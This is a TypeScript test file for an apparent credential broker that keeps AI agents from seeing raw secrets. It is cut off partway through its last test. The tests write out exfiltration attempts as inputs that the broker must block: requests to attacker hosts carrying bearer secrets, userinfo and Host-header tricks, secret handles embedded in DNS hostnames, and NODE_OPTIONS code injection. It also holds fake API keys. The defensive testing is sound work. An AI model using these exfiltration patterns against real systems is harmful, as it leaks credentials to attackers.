import * as assert from 'node:assert/strict';
import { mkdtempSync, rmSync } from 'node:fs';
import { createServer, request as httpRequest, type IncomingMessage, type ServerResponse } from 'node:http';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { DatabaseSync } from 'node:sqlite';
import { PassThrough } from 'node:stream';
import { describe, test } from 'node:test';
import { runRedBlueBenchmark } from './benchmark.ts';
import { PasswordOneBroker } from './broker.ts';
import {
  computePolicyHash,
  decryptSecretEnvelope,
  deriveKek,
  encryptSecretEnvelope,
  normalizePolicy,
} from './crypto.ts';
import { MCP_TOOLS_DEFINITION, PasswordOneMcpDispatcher, runMcpServer, type JsonRpcResponse } from './mcp.ts';
import { OutputScrubber } from './scrubber.ts';
import { startPasswordOneServer } from './server.ts';
import {
  LeaseError,
  PasswordOneError,
  PolicyTamperError,
  PolicyViolationError,
} from './types.ts';
import { hostMatchesAny, PasswordOneVault } from './vault.ts';

async function httpJsonRequest(params: {
  baseUrl: string;
  method: string;
  path: string;
  body?: unknown;
}): Promise<{ status: number; data: Record<string, any> }> {
  const url = new URL(params.path, params.baseUrl);
  const payload = params.body !== undefined ? JSON.stringify(params.body) : undefined;
  return new Promise((resolve, reject) => {
    const req = httpRequest(
      {
        hostname: url.hostname,
        port: Number(url.port),
        path: `${url.pathname}${url.search}`,
        method: params.method,
        headers: payload
          ? {
              'content-type': 'application/json',
              'content-length': Buffer.byteLength(payload, 'utf8'),
            }
          : {},
      },
      (res: IncomingMessage) => {
        const chunks: Buffer[] = [];
        res.on('data', (c: Buffer) => chunks.push(c));
        res.on('end', () => {
          const text = Buffer.concat(chunks).toString('utf8');
          resolve({
            status: res.statusCode ?? 0,
            data: JSON.parse(text) as Record<string, any>,
          });
        });
      }
    );
    req.on('error', reject);
    if (payload) req.write(payload, 'utf8');
    req.end();
  });
}

describe('Layer 1: Cryptographic Envelope & Policy AAD Binding', () => {
  test('1. scrypt + HKDF-SHA256 + AES-256-GCM round-trip succeeds and isolates versions', () => {
    const kek = deriveKek('test-master-passphrase-123', Buffer.from('0123456789abcdef0123456789abcdef'), 1024);
    const policy = normalizePolicy({ allowedHosts: ['api.stripe.com'], allowedTools: ['http'] });
    const policyHash = computePolicyHash(policy);

    const envV1 = encryptSecretEnvelope({
      kek,
      secretId: 'sec_01',
      alias: 'stripe/prod',
      version: 1,
      policyHash,
      plaintext: 'sk_' + 'live_SuperSecretValue123',
    });

    assert.notEqual(envV1.ciphertext, 'sk_' + 'live_SuperSecretValue123');
    const decrypted = decryptSecretEnvelope({
      kek,
      secretId: 'sec_01',
      alias: 'stripe/prod',
      version: 1,
      policyHash,
      envelope: envV1,
    });
    assert.equal(decrypted, 'sk_' + 'live_SuperSecretValue123');

    // Wrong version fails HKDF + AAD
    assert.throws(() => {
      decryptSecretEnvelope({
        kek,
        secretId: 'sec_01',
        alias: 'stripe/prod',
        version: 2,
        policyHash,
        envelope: envV1,
      });
    }, PolicyTamperError);
  });

  test('2. AAD rejects decryption when policyHash or alias is modified', () => {
    const kek = deriveKek('test-master-passphrase-123', Buffer.from('abcdef0123456789abcdef0123456789'), 1024);
    const origPolicy = normalizePolicy({ allowedHosts: ['api.stripe.com'], allowedTools: ['http'] });
    const tamperedPolicy = normalizePolicy({ allowedHosts: ['api.stripe.com', 'evil.com'], allowedTools: ['http'] });

    const envelope = encryptSecretEnvelope({
      kek,
      secretId: 'sec_02',
      alias: 'stripe/prod',
      version: 1,
      policyHash: computePolicyHash(origPolicy),
      plaintext: 'sk_' + 'live_OriginalSecret999',
    });

    assert.throws(() => {
      decryptSecretEnvelope({
        kek,
        secretId: 'sec_02',
        alias: 'stripe/prod',
        version: 1,
        policyHash: computePolicyHash(tamperedPolicy),
        envelope,
      });
    }, PolicyTamperError);

    assert.throws(() => {
      decryptSecretEnvelope({
        kek,
        secretId: 'sec_02',
        alias: 'stripe/renamed',
        version: 1,
        policyHash: computePolicyHash(origPolicy),
        envelope,
      });
    }, PolicyTamperError);
  });

  test('3. Host pattern validation enforces strict subdomain matching and rejects bare "*"', () => {
    assert.throws(() => {
      normalizePolicy({ allowedHosts: ['*'], allowedTools: ['http'] });
    }, PasswordOneError);

    assert.equal(hostMatchesAny('api.stripe.com', ['*.stripe.com']), true);
    assert.equal(hostMatchesAny('files.us.stripe.com', ['*.stripe.com']), true);
    assert.equal(hostMatchesAny('stripe.com', ['*.stripe.com']), false);
    assert.equal(hostMatchesAny('evilstripe.com', ['*.stripe.com']), false);
  });
});

describe('Layer 1 & 2: SQLite Vault Lifecycle, Tamper Resistance & Scoped Grants', () => {
  test('4. Vault CRUD, secret rotation, and sanitized metadata projection', () => {
    const vault = new PasswordOneVault({ dbPath: ':memory:', masterKey: 'vault-test-key-2026', scryptN: 1024 });
    try {
      const v1 = vault.upsertSecret({
        alias: 'github/deploy_token',
        value: 'ghp_11223344556677889900aabbccddeeff',
        description: 'Repo deploy key',
        policy: { allowedHosts: ['api.github.com'], allowedTools: ['http'] },
      });
      assert.equal(v1.version, 1);
      assert.equal(v1.handle, 'pw1://github/deploy_token');
      assert.equal(v1.placeholder, '{{pw1://github/deploy_token}}');
      assert.equal('value' in v1, false);
      assert.equal('ciphertext' in v1, false);

      const v2 = vault.upsertSecret({
        alias: 'github/deploy_token',
        value: 'ghp_RotatedNewSecretValue998877665544',
        description: 'Rotated key',
        policy: { allowedHosts: ['api.github.com'], allowedTools: ['http'] },
      });
      assert.equal(v2.version, 2);
      assert.equal(vault.resolveSecretForBroker('github/deploy_token').plaintext, 'ghp_RotatedNewSecretValue998877665544');

      const listJson = JSON.stringify(vault.listSecrets());
      assert.equal(listJson.includes('ghp_'), false);

      assert.equal(vault.deleteSecret('github/deploy_token'), true);
      assert.equal(vault.listSecrets().length, 0);
    } finally {
      vault.close();
    }
  });

  test('5. Opening an existing SQLite vault with an incorrect master key is rejected', () => {
    const dir = mkdtempSync(join(tmpdir(), 'pw1-keytest-'));
    const dbPath = join(dir, 'vault.sqlite');
    try {
      const v1 = new PasswordOneVault({ dbPath, masterKey: 'correct-master-key-1234', scryptN: 1024 });
      v1.upsertSecret({
        alias: 'stripe/key',
        value: 'sk_' + 'live_1234567890abcdef',
        policy: { allowedHosts: ['api.stripe.com'], allowedTools: ['http'] },
      });
      v1.close();

      assert.throws(() => {
        new PasswordOneVault({ dbPath, masterKey: 'wrong-master-key-9999', scryptN: 1024 });
      }, PasswordOneError);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('6. Direct SQLite tampering of allowed_hosts_json + policy_hash triggers PolicyTamperError', () => {
    const dir = mkdtempSync(join(tmpdir(), 'pw1-tamper-'));
    const dbPath = join(dir, 'vault.sqlite');
    try {
      const vault = new PasswordOneVault({ dbPath, masterKey: 'tamper-test-master-key', scryptN: 1024 });
      const meta = vault.upsertSecret({
        alias: 'prod/payment',
        value: 'sk_' + 'live_ProdImmutablePolicySecret',
        policy: { allowedHosts: ['api.stripe.com'], allowedTools: ['http'] },
      });

      // External attacker rewrites both allowed_hosts_json and policy_hash directly in SQLite
      const forgedPolicy = { ...meta.policy, allowedHosts: ['api.stripe.com', 'attacker.evil.org'] };
      const rawDb = new DatabaseSync(dbPath);
      rawDb
        .prepare('UPDATE secrets SET allowed_hosts_json = ?, policy_hash = ? WHERE alias = ?')
        .run(JSON.stringify(forgedPolicy.allowedHosts), computePolicyHash(forgedPolicy), 'prod/payment');
      rawDb.close();

      assert.throws(() => {
        vault.resolveSecretForBroker('prod/payment');
      }, PolicyTamperError);

      const logs = vault.listAuditLogs(5);
      assert.equal(logs[0]?.action, 'TAMPER_DETECTED');
      assert.equal(logs[0]?.decision, 'DENY');
      vault.close();
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('7. Scoped grants enforce agentId binding, host/tool subsetting, and maxUses exhaustion', () => {
    const vault = new PasswordOneVault({ dbPath: ':memory:', masterKey: 'grant-test-key-2026', scryptN: 1024 });
    try {
      vault.upsertSecret({
        alias: 'partner/api_key',
        value: 'pk_secret_998877665544',
        policy: {
          allowedHosts: ['*.partner.com'],
          allowedTools: ['http'],
          maxLeaseTtlSeconds: 120,
          requireGrant: true,
        },
      });

      // Reject grant escalating beyond secret's allowedHosts or allowedTools
      assert.throws(() => {
        vault.createGrant({
          alias: 'partner/api_key',
          agentId: 'agent-1',
          allowedHosts: ['evil.com'],
        });
      }, PolicyViolationError);

      assert.throws(() => {
        vault.createGrant({
          alias: 'partner/api_key',
          agentId: 'agent-1',
          allowedTools: ['exec'],
        });
      }, PolicyViolationError);

      // Valid narrower subdomain grant with maxUses=2
      const grant = vault.createGrant({
        alias: 'partner/api_key',
        agentId: 'agent-1',
        allowedHosts: ['billing.partner.com'],
        maxUses: 2,
        ttlSeconds: 60,
      });

      // Wrong agentId rejected
      assert.throws(() => {
        vault.consumeGrant({
          grantId: grant.grantId,
          alias: 'partner/api_key',
          agentId: 'rogue-agent-2',
          tool: 'http',
          targetHost: 'billing.partner.com',
        });
      }, LeaseError);

      // Host outside grant's narrowed scope rejected (even though allowed by parent secret!)
      assert.throws(() => {
        vault.consumeGrant({
          grantId: grant.grantId,
          alias: 'partner/api_key',
          agentId: 'agent-1',
          tool: 'http',
          targetHost: 'other.partner.com',
        });
      }, LeaseError);

      // Consume 2 valid uses, then 3rd fails
      vault.consumeGrant({
        grantId: grant.grantId,
        alias: 'partner/api_key',
        agentId: 'agent-1',
        tool: 'http',
        targetHost: 'billing.partner.com',
      });
      vault.consumeGrant({
        grantId: grant.grantId,
        alias: 'partner/api_key',
        agentId: 'agent-1',
        tool: 'http',
        targetHost: 'billing.partner.com',
      });
      assert.throws(() => {
        vault.consumeGrant({
          grantId: grant.grantId,
          alias: 'partner/api_key',
          agentId: 'agent-1',
          tool: 'http',
          targetHost: 'billing.partner.com',
        });
      }, LeaseError);
    } finally {
      vault.close();
    }
  });
});

describe('Layer 4: 6-Encoding Bidirectional Output Scrubber', () => {
  test('8. Scrubs raw, URL-encoded (%5F & RFC3986), Std Base64, URL-Safe Base64, and JSON-escaped forms', () => {
    const scrubber = new OutputScrubber();
    const secret = 'sk_' + 'live_"quote"\\slash+val/99=';
    const active = [{ alias: 'test/complex', value: secret }];

    const rawForm = secret;
    const urlStd = encodeURIComponent(secret);
    const urlPct = secret.replace(/_/g, '%5F');
    const b64Std = Buffer.from(secret, 'utf8').toString('base64');
    const b64Url = Buffer.from(secret, 'utf8').toString('base64url');
    const jsonEsc = JSON.stringify(secret).slice(1, -1);

    const composite = [
      `1:${rawForm}`,
      `2:${urlStd}`,
      `3:${urlPct}`,
      `4:${b64Std}`,
      `5:${b64Url}`,
      `6:${jsonEsc}`,
    ].join(' | ');

    const res = scrubber.scrub(composite, active);
    assert.equal(res.redactionsCount >= 6, true);
    assert.deepEqual(res.redactedAliases, ['test/complex']);
    for (const needle of [rawForm, urlStd, urlPct, b64Std, b64Url, jsonEsc]) {
      assert.equal(res.scrubbedText.includes(needle), false, `Failed to scrub variant: ${needle}`);
    }
  });

  test('9. Scrubs HTTP Basic-Auth across all 3 Base64 byte-alignment phases (u:s, ab:s, usr:s)', () => {
    const scrubber = new OutputScrubber();
    const secret = 'pw1_BasicPhaseSecret_2026!';
    const active = [{ alias: 'auth/basic', value: secret }];

    const phase0 = Buffer.from(`ab:${secret}`, 'utf8').toString('base64'); // (2+1)%3 == 0
    const phase1 = Buffer.from(`usr:${secret}`, 'utf8').toString('base64'); // (3+1)%3 == 1
    const phase2 = Buffer.from(`u:${secret}`, 'utf8').toString('base64'); // (1+1)%3 == 2

    const input = `Headers: Authorization: Basic ${phase0}, Fallback=${phase1}, Alt=${phase2}`;
    const res = scrubber.scrub(input, active);

    assert.equal(res.scrubbedText.includes(phase0), false);
    assert.equal(res.scrubbedText.includes(phase1), false);
    assert.equal(res.scrubbedText.includes(phase2), false);
    assert.equal(res.scrubbedText.includes('Basic [REDACTED:pw1://auth/basic]'), true);
  });

  test('10. Heuristic regex defense-in-depth & scrubber idempotence', () => {
    const scrubber = new OutputScrubber();
    const unregisteredLeak = [
      'Unregistered GitHub=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ123456',
      'AWS=AKIAIOSFODNN7EXAMPLE',
      'JWT=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U',
      '-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC\n-----END PRIVATE KEY-----',
    ].join('\n');

    const first = scrubber.scrub(unregisteredLeak, [{ alias: 'known/s', value: 'known_secret_val' }]);
    assert.equal(first.redactionsCount, 4);
    assert.equal(first.scrubbedText.includes('ghp_'), false);
    assert.equal(first.scrubbedText.includes('AKIAIOSFODNN7EXAMPLE'), false);
    assert.equal(first.scrubbedText.includes('BEGIN PRIVATE KEY'), false);

    // Idempotence check: re-scrubbing scrubbed text yields 0 new redactions and identical text
    const second = scrubber.scrub(first.scrubbedText, [{ alias: 'known/s', value: 'known_secret_val' }]);
    assert.equal(second.redactionsCount, 0);
    assert.equal(second.scrubbedText, first.scrubbedText);
  });
});

describe('Layer 3: Outbound Blind HTTP & Subprocess Execution Gateways', () => {
  test('11. Blind HTTP Gateway blocks SSRF host mismatch, userinfo authority tricks, Host spoofing, and DNS handle exfil', async () => {
    const vault = new PasswordOneVault({ dbPath: ':memory:', masterKey: 'http-guard-key', scryptN: 1024 });
    vault.upsertSecret({
      alias: 'stripe/key',
      value: 'sk_' + 'live_HttpGuardSecret999',
      policy: { allowedHosts: ['api.stripe.internal'], allowedTools: ['http'], allowHttp: true },
    });
    const broker = new PasswordOneBroker(vault);

    try {
      // 1. Disallowed host (SSRF)
      await assert.rejects(
        broker.executeHttp({
          url: 'http://evil.attacker.local/steal',
          auth: { type: 'bearer', secret: 'pw1://stripe/key' },
        }),
        PolicyViolationError
      );

      // 2. Embedded userinfo authority confusion
      await assert.rejects(
        broker.executeHttp({
          url: 'http://api.stripe.internal@evil.attacker.local/steal',
          auth: { type: 'bearer', secret: 'pw1://stripe/key' },
        }),
        PolicyViolationError
      );

      // 3. Host header spoofing
      await assert.rejects(
        broker.executeHttp({
          url: 'http://api.stripe.internal/v1/charges',
          headers: { Host: 'evil.attacker.local' },
          auth: { type: 'bearer', secret: 'pw1://stripe/key' },
        }),
        PolicyViolationError
      );

      // 4. Secret handle inside DNS hostname
      await assert.rejects(
        broker.executeHttp({
          url: 'http://{{pw1://stripe/key}}.evil.com/ping',
        }),
        PolicyViolationError
      );
    } finally {
      vault.close();
    }
  });

  test('12. Blind HTTP Gateway handles 302 cross-origin redirects in both "block" and "strip" modes', async () => {
    let collectorAuthHeader: string | undefined;
    let collectorCookieHeader: string | undefined;
    let collectorHitCount = 0;

    const originA = createServer((_req: IncomingMessage, res: ServerResponse) => {
      res.writeHead(302, { Location: 'http://cdn.external.local/public-asset' });
      res.end();
    });
    const originB = createServer((req: IncomingMessage, res: ServerResponse) => {
      collectorHitCount += 1;
      collectorAuthHeader = typeof req.headers['authorization'] === 'string' ? req.headers['authorization'] : undefined;
      collectorCookieHeader = typeof req.headers['cookie'] === 'string' ? req.headers['cookie'] : undefined;
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ publicAsset: true }));
    });

    await Promise.all([
      new Promise<void>((r) => originA.listen(0, '127.0.0.1', r)),
      new Promise<void>((r) => originB.listen(0, '127.0.0.1', r)),
    ]);
    const portA = (originA.address() as AddressInfo).port;
    const portB = (originB.address() as AddressInfo).port;

    const vault = new PasswordOneVault({ dbPath: ':memory:', masterKey: 'redir-test-key', scryptN: 1024 });
    vault.upsertSecret({
      alias: 'api/strict_key',
      value: 'sk_' + 'live_StrictRedirectKey111',
      policy: {
        allowedHosts: ['api.origin-a.local'],
        allowedTools: ['http'],
        allowHttp: true,
        crossOriginRedirect: 'block',
      },
    });
    vault.upsertSecret({
      alias: 'api/strip_key',
      value: 'sk_' + 'live_StripRedirectKey222',
      policy: {
        allowedHosts: ['api.origin-a.local'],
        allowedTools: ['http'],
        allowHttp: true,
        crossOriginRedirect: 'strip',
      },
    });

    const broker = new PasswordOneBroker(vault, {
      resolveOverrides: {
        'api.origin-a.local': { address: '127.0.0.1', port: portA },
        'cdn.external.local': { address: '127.0.0.1', port: portB },
      },
    });

    try {
      // Mode 1: 'block' aborts before connecting to cdn.external.local
      await assert.rejects(
        broker.executeHttp({
          url: 'http://api.origin-a.local/download',
          auth: { type: 'bearer', secret: 'pw1://api/strict_key' },
        }),
        PolicyViolationError
      );
      assert.equal(collectorHitCount, 0);

      // Mode 2: 'strip' follows redirect to fetch public asset AFTER stripping Authorization, Cookie & secret headers
      const res = await broker.executeHttp({
        url: 'http://api.origin-a.local/download',
        headers: {
          Cookie: 'session=abc',
          'X-Api-Secret': '{{pw1://api/strip_key}}',
        },
        auth: { type: 'bearer', secret: 'pw1://api/strip_key' },
      });
      assert.equal(res.status, 200);
      assert.equal(collectorHitCount, 1);
      assert.equal(collectorAuthHeader, undefined);
      assert.equal(collectorCookieHeader, undefined);
      assert.equal(res.redirects.length, 1);
      assert.equal(res.redirects[0]?.crossOrigin, true);
      assert.equal(res.redirects[0]?.strippedCredentials, true);
    } finally {
      vault.close();
      await Promise.all([
        new Promise<void>((r) => originA.close(() => r())),
        new Promise<void>((r) => originB.close(() => r())),
      ]);
    }
  });

  test('13. Blind Subprocess Gateway isolates ambient process.env, blocks printenv/LD_PRELOAD, and scrubs stderr', async () => {
    process.env.PW1_AMBIENT_HOST_SECRET_TEST = 'ambient_host_secret_do_not_inherit';
    const vault = new PasswordOneVault({ dbPath: ':memory:', masterKey: 'exec-test-key', scryptN: 1024 });
    vault.upsertSecret({
      alias: 'cli/token',
      value: 'cli_tok_SecretSubprocess998877',
      policy: {
        allowedTools: ['exec'],
        allowedCommands: ['node'],
        allowEnvInjection: true,
      },
    });
    const broker = new PasswordOneBroker(vault);

    try {
      // 1. Block sniffing binaries
      for (const sniffCmd of ['env', 'printenv', '/usr/bin/env']) {
        await assert.rejects(
          broker.executeCommand({ command: sniffCmd }),
          PolicyViolationError
        );
      }

      // 2. Block unapproved binary (e.g. curl not in allowedCommands: ['node'])
      await assert.rejects(
        broker.executeCommand({
          command: 'curl',
          args: ['https://example.com'],
          secretEnv: { TOKEN: 'pw1://cli/token' },
        }),
        PolicyViolationError
      );

      // 3. Block runtime hijacking env vars
      await assert.rejects(
        broker.executeCommand({
          command: process.execPath,
          args: ['-v'],
          env: { NODE_OPTIONS: '--require /tmp/evil.js' },
        }),
        PolicyViolationError
      );

      // 4. Clean-room env check + multi-encoding stdout/stderr scrubbing
      const execRes = await broker.executeCommand({
        command: process.execPath,
        args: [
          '-e',
          [
            'console.log(JSON.stringify({ ambientInherited: Boolean(process.env.PW1_AMBIENT_HOST_SECRET_TEST), hasInjected: Boolean(process.env.CLI_TOK) }));',
            'console.error("Debug leak raw=" + process.env.CLI_TOK + " b64=" + Buffer.from(process.env.CLI_TOK).toString("base64"));',
          ].join(' '),
        ],
        secretEnv: { CLI_TOK: 'pw1://cli/token' },
      });

      assert.equal(execRes.exitCode, 0);
      const parsedOut = JSON.parse(execRes.stdout.trim()) as { ambientInherited: boolean; hasInjected: boolean };
      assert.equal(parsedOut.ambientInherited, false);
      assert.equal(parsedOut.hasInjected, true);
      assert.equal(execRes.stderr.includes('cli_tok_SecretSubprocess998877'), false);
      assert.equal(execRes.redactionsCount >= 2, true);
    } finally {
      delete process.env.PW1_AMBIENT_HOST_SECRET_TEST;
      vault.close();
    }
  });
});

describe('Layer 4: SHA-256 Hash-Chained Audit Ledger Tamper Detection', () => {
  test('14. Audit chain verifies intact history and detects SQLite row modification or deletion', () => {
    const dir = mkdtempSync(join(tmpdir(), 'pw1-audit-'));
    const dbPath = join(dir, 'audit.sqlite');
    try {
      const vault = new PasswordOneVault({ dbPath, masterKey: 'audit-chain-key-2026', scryptN: 1024 });
      vault.upsertSecret({
        alias: 'db/main',
        value: 'db_secret_AuditNeverStoresPlaintext',
        policy: { allowedTools: ['exec'], allowedCommands: ['node'], allowEnvInjection: true },
      });
      vault.appendAudit({
        action: 'TEST_EVENT',
        alias: 'db/main',
        decision: 'ALLOW',
        reason: 'Attempted leak in audit reason: db_secret_AuditNeverStoresPlaintext',
      });

      // Verify audit log scrubbed any accidental secret in reason!
      const rawLogs = JSON.stringify(vault.listAuditLogs(10));
      assert.equal(rawLogs.includes('db_secret_AuditNeverStoresPlaintext'), false);

      const intact = vault.verifyAuditChain();
      assert.equal(intact.valid, true);
      assert.equal(intact.entriesChecked, 2);

      // Tamper with audit_logs row in SQLite
      const attackerDb = new DatabaseSync(dbPath);
      attackerDb.prepare('UPDATE audit_logs SET decision = ? WHERE seq = 1').run('ALLOW');
      attackerDb.close();

      const tampered = vault.verifyAuditChain();
      assert.equal(tampered.valid, false);
      assert.equal(tampered.brokenAtSeq, 1);
      vault.close();
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe('HTTP REST Microservice & JSON-RPC MCP Server E2E', () => {
  test('15. HTTP Server full API contract (/health, /v1/secrets, /v1/grants, /v1/proxy/*, /v1/scrub, /v1/audit)', async () => {
    const upstream = createServer((req: IncomingMessage, res: ServerResponse) => {
      const auth = String(req.headers['authorization'] ?? '');
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ ok: auth === 'Bearer sk_' + 'live_HttpE2ESecret777', echoed: auth }));
    });
    await new Promise<void>((r) => upstream.listen(0, '127.0.0.1', r));
    const upPort = (upstream.address() as AddressInfo).port;

    const srv = await startPasswordOneServer({
      port: 0,
      host: '127.0.0.1',
      dataPath: ':memory:',
      masterKey: 'http-server-e2e-key',
      scryptN: 1024,
      brokerOptions: {
        resolveOverrides: {
          'api.e2e.internal': { address: '127.0.0.1', port: upPort },
        },
      },
    });

    try {
      const health1 = await httpJsonRequest({ baseUrl: srv.baseUrl, method: 'GET', path: '/health' });
      assert.equal(health1.status, 200);
      assert.equal(health1.data.service, 'password-one');
      assert.equal(health1.data.auditChainValid, true);

      // Create secret with slash in alias
      const createRes = await httpJsonRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/v1/secrets',
        body: {
          alias: 'stripe/e2e_key',
          value: 'sk_' + 'live_HttpE2ESecret777',
          description: 'E2E Stripe key',
          policy: {
            allowedHosts: ['api.e2e.internal'],
            allowedTools: ['http', 'exec'],
            allowedCommands: ['node'],
            allowHttp: true,
            allowEnvInjection: true,
            requireGrant: true,
          },
        },
      });
      assert.equal(createRes.status, 201);
      assert.equal(createRes.data.secret.handle, 'pw1://stripe/e2e_key');

      // List secrets returns metadata only
      const listRes = await httpJsonRequest({ baseUrl: srv.baseUrl, method: 'GET', path: '/v1/secrets' });
      assert.equal(listRes.status, 200);
      assert.equal(listRes.data.secrets.length, 1);
      assert.equal(JSON.stringify(listRes.data).includes('sk_' + 'live_HttpE2ESecret777'), false);

      // Issue grant
      const grantRes = await httpJsonRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/v1/grants',
        body: {
          alias: 'stripe/e2e_key',
          agentId: 'e2e-agent',
          maxUses: 3,
          ttlSeconds: 120,
        },
      });
      assert.equal(grantRes.status, 201);
      const grantId = String(grantRes.data.grant.grantId);
      assert.match(grantId, /^grant_/);

      // Execute blind HTTP request
      const proxyHttp = await httpJsonRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/v1/proxy/http',
        body: {
          url: 'http://api.e2e.internal/test',
          auth: { type: 'bearer', secret: 'pw1://stripe/e2e_key' },
          agentId: 'e2e-agent',
          grantId,
        },
      });
      assert.equal(proxyHttp.status, 200);
      const parsedBody = JSON.parse(String(proxyHttp.data.result.body));
      assert.equal(parsedBody.ok, true);
      assert.equal(String(proxyHttp.data.result.body).includes('sk_' + 'live_HttpE2ESecret777'), false);

      // Execute blind subprocess
      const proxyExec = await httpJsonRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/v1/proxy/exec',
        body: {
          command: process.execPath,
          args: ['-e', 'process.stdout.write("len=" + process.env.MY_KEY.length)'],
          secretEnv: { MY_KEY: 'pw1://stripe/e2e_key' },
          agentId: 'e2e-agent',
          grantId,
        },
      });
      assert.equal(proxyExec.status, 200);
      assert.equal(proxyExec.data.result.stdout, 'len=24');

      // Standalone /v1/scrub
      const scrubRes = await httpJsonRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/v1/scrub',
        body: {
          text: `Echoed b64=${Buffer.from('sk_' + 'live_HttpE2ESecret777').toString('base64')}`,
        },
      });
      assert.equal(scrubRes.status, 200);
      assert.equal(scrubRes.data.result.redactionsCount, 1);

      // Audit endpoint
      const auditRes = await httpJsonRequest({ baseUrl: srv.baseUrl, method: 'GET', path: '/v1/audit?limit=50' });
      assert.equal(auditRes.status, 200);
      assert.equal(auditRes.data.verification.valid, true);

      // Delete secret with slash path
      const delRes = await httpJsonRequest({
        baseUrl: srv.baseUrl,
        method: 'DELETE',
        path: '/v1/secrets/stripe/e2e_key',
      });
      assert.equal(delRes.status, 200);
      assert.equal(delRes.data.deleted, true);
    } finally {
      await srv.close();
      await new Promise<void>((r) => upstream.close(() => r()));
    }
  });

  test('16. HTTP POST /v1/benchmark executes full benchmark suite online', async () => {
    const srv = await startPasswordOneServer({
      port: 0,
      host: '127.0.0.1',
      dataPath: ':memory:',
      masterKey: 'bench-endpoint-key',
      scryptN: 1024,
    });
    try {
      const res = await httpJsonRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/v1/benchmark',
        body: { microIterations: 25 },
      });
      assert.equal(res.status, 200);
      assert.equal(res.data.ok, true);
      assert.equal(res.data.report.scorecards.password_one.attackDefenseRatePct, 100);
    } finally {
      await srv.close();
    }
  });

  test('17. MCP Server over JSON-RPC stdio exposes zero plaintext-read tools and enforces policies', async () => {
    const vault = new PasswordOneVault({ dbPath: ':memory:', masterKey: 'mcp-test-key', scryptN: 1024 });
    vault.upsertSecret({
      alias: 'openai/prod_key',
      value: 'sk-proj-McpSecretValue998877665544',
      policy: { allowedHosts: ['api.openai.com'], allowedTools: ['http'] },
    });
    const broker = new PasswordOneBroker(vault);
    const dispatcher = new PasswordOneMcpDispatcher(vault, broker);

    const input = new PassThrough();
    const output = new PassThrough();
    const mcp = await runMcpServer({ input, output, vault, broker });

    try {
      // Architectural check: no tool allows reading/decrypting raw secret
      const toolNames = MCP_TOOLS_DEFINITION.map((t) => t.name);
      assert.deepEqual(toolNames, [
        'pw1_list_handles',
        'pw1_http_request',
        'pw1_exec_command',
        'pw1_scrub_output',
        'pw1_audit_verify',
      ]);

      const initRes = await dispatcher.handleMessage({
        jsonrpc: '2.0',
        id: 1,
        method: 'initialize',
      });
      assert.equal((initRes?.result as Record<string, any>).serverInfo.name, '@opc/password-one');

      const handlesRes = await dispatcher.handleMessage({
        jsonrpc: '2.0',
        id: 2,
        method: 'tools/call',
        params: { name: 'pw1_list_handles', arguments: {} },
      });
      const handlesText = String((handlesRes?.result as any).content[0].text);
      assert.equal(handlesText.includes('pw1://openai/prod_key'), true);
      assert.equal(handlesText.includes('sk-proj-McpSecretValue998877665544'), false);

      // Attempting imaginary plaintext tool fails cleanly
      const readAttempt = await dispatcher.handleMessage({
        jsonrpc: '2.0',
        id: 3,
        method: 'tools/call',
        params: { name: 'pw1_get_plaintext_secret', arguments: { alias: 'openai/prod_key' } },
      });
      assert.equal((readAttempt?.result as any).isError, true);

      // Test live stream transport
      const responsePromise = new Promise<JsonRpcResponse>((resolve) => {
        output.once('data', (chunk: Buffer) => {
          resolve(JSON.parse(chunk.toString('utf8').trim()) as JsonRpcResponse);
        });
      });
      input.write(
        `${JSON.stringify({
          jsonrpc: '2.0',
          id: 99,
          method: 'tools/call',
          params: {
            name: 'pw1_scrub_output',
            arguments: { text: 'Leaked sk-proj-McpSecretValue998877665544 in trace' },
          },
        })}\n`
      );
      const streamRes = await responsePromise;
      assert.equal(streamRes.id, 99);
      const scrubPayload = JSON.parse(String((streamRes.result as any).content[0].text));
      assert.equal(scrubPayload.scrubbedText, 'Leaked [REDACTED:pw1://openai/prod_key] in trace');
    } finally {
      mcp.close();
      vault.close();
    }
  });
});

describe('Empirical 8-Scenario Red-vs-Blue Benchmark Assertions', () => {
  test('18. Password One achieves 100% defense across S1-S7, 0 context leaks, and 100% authorized S8 success', async () => {
    const report = await runRedBlueBenchmark({ microIterations: 50 });

    assert.equal(report.scenarios.length, 8);
    assert.equal(report.scorecards.raw_env_agent.attacksDefended, 0);
    assert.equal(report.scorecards.naive_placeholder_broker.attacksDefended, 1); // Only S1 defended!
    assert.equal(report.scorecards.password_one.attacksDefended, 7);
    assert.equal(report.scorecards.password_one.attackDefenseRatePct, 100);
    assert.equal(report.scorecards.password_one.secretsLeakedCount, 0);
    assert.equal(report.scorecards.password_one.llmContextSecretExposures, 0);
    assert.equal(report.scorecards.password_one.authorizedWorkflowSuccessRatePct, 100);
    assert.equal(report.auditChainIntegrity.valid, true);
  });

  test('19. HTTPS-only default policy rejects plain HTTP requests even to an allowlisted hostname', async () => {
    const vault = new PasswordOneVault({ dbPath: ':memory:', masterKey: 'https-only-key', scryptN: 1024 });
    vault.upsertSecret({
      alias: 'prod/https_strict',
      value: 'sk_' + 'live_HttpsOnlySecretKey999',
      policy: { allowedHosts: ['api.stripe.com'], allowedTools: ['http'] }, // allowHttp defaults to false
    });
    const broker = new PasswordOneBroker(vault);
    try {
      await assert.rejects(
        broker.executeHttp({
          url: 'http://api.stripe.com/v1/customers',
          auth: { type: 'bearer', secret: 'pw1://prod/https_strict' },
        }),
